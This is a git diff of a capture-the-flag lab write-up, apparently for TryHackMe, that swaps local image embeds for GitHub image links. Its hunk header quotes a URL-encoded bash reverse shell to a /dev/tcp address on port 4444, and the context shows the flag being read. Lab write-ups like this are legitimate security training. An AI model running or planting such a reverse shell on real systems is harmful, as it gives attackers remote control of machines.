@@ -197,7 +197,8 @@ bash+-c+'bash+-i+>%26+/dev/tcp/10.64.81.180/4444+0>%261'
 
 **GOT THE SHELLL!**
 
-![[Pasted image 20260708203245.png]]
+
+![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203245.png)
 
 
 Reading the flag:
@@ -206,7 +207,8 @@ Reading the flag:
 cat /var/www/flag.txt
 ```
 
-![[Pasted image 20260708203416.png]]
+
+![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203416.png)
 
 ### Summary
 
